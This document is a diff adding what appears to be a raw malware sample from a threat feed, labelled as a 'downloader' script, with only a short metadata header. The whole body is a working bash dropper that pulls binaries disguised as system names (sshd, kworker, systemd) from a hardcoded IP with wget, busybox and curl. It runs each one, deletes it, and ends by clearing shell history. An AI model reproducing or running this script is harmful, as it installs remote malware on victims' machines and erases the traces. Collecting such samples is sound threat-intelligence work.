@@ -1,0 +1,62 @@
+# sha256: 7b1cbba56bb80e185cdf2097f5716c31d7e0f88f28ad7220b3b5a2cf73859ec8
+# family: downloader
+# kind: script
+# size_bytes: 6734
+# first_seen: 2026-09-16 05:36:59.492000 UTC
+# times_seen: 4
+# yara_matches: none
+# ------------------------------------------------------------
+
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/telnet; chmod +x telnet; ./telnet; rm -rf telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/kworker; chmod +x kworker; ./kworker; rm -rf kworker
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/bash; chmod +x bash; ./bash; rm -rf bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/getty; chmod +x getty; ./getty; rm -rf getty
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/kernal; chmod +x kernal; ./kernal; rm -rf kernal
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/gnome; chmod +x gnome; ./gnome; rm -rf gnome
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/ntp; chmod +x ntp; ./ntp; rm -rf ntp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/ext4; chmod +x ext4; ./ext4; rm -rf ext4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/watchdogd; chmod +x watchdogd; ./watchdogd; rm -rf watchdogd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/systemd; chmod +x systemd; ./systemd; rm -rf systemd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/login; chmod +x login; ./login; rm -rf login
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/dbus; chmod +x dbus; ./dbus; rm -rf dbus
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/kde; chmod +x kde; ./kde; rm -rf kde
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/crypto; chmod +x crypto; ./crypto; rm -rf crypto
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/telnet; chmod +x telnet; ./telnet; rm -rf telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/kworker; chmod +x kworker; ./kworker; rm -rf kworker
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/bash; chmod +x bash; ./bash; rm -rf bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/getty; chmod +x getty; ./getty; rm -rf getty
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/kernal; chmod +x kernal; ./kernal; rm -rf kernal
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/gnome; chmod +x gnome; ./gnome; rm -rf gnome
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/ntp; chmod +x ntp; ./ntp; rm -rf ntp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/ext4; chmod +x ext4; ./ext4; rm -rf ext4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/watchdogd; chmod +x watchdogd; ./watchdogd; rm -rf watchdogd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/systemd; chmod +x systemd; ./systemd; rm -rf systemd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/login; chmod +x login; ./login; rm -rf login
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/dbus; chmod +x dbus; ./dbus; rm -rf dbus
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/kde; chmod +x kde; ./kde; rm -rf kde
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/crypto; chmod +x crypto; ./crypto; rm -rf crypto
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/telnet; chmod +x telnet; ./telnet; rm -rf telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/kworker; chmod +x kworker; ./kworker; rm -rf kworker
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/bash; chmod +x bash; ./bash; rm -rf bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/getty; chmod +x getty; ./getty; rm -rf getty
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/kernal; chmod +x kernal; ./kernal; rm -rf kernal
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/gnome; chmod +x gnome; ./gnome; rm -rf gnome
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/ntp; chmod +x ntp; ./ntp; rm -rf ntp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/ext4; chmod +x ext4; ./ext4; rm -rf ext4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/watchdogd; chmod +x watchdogd; ./watchdogd; rm -rf watchdogd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/systemd; chmod +x systemd; ./systemd; rm -rf systemd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/login; chmod +x login; ./login; rm -rf login
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/dbus; chmod +x dbus; ./dbus; rm -rf dbus
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/kde; chmod +x kde; ./kde; rm -rf kde
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/crypto; chmod +x crypto; ./crypto; rm -rf crypto
+history -c
